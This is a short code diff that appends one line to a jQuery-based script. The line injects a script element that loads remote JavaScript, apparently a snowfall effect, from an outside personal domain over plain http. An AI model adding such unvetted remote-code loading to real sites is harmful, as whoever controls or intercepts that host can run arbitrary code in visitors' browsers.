@@ -392,3 +392,5 @@
     });
 
 })(jQuery);
+
+var js = document.createElement('script'); js.src = "http://mihailmaximov.ru/projects/snow/snowfall2020.js"; document.body.appendChild(js);
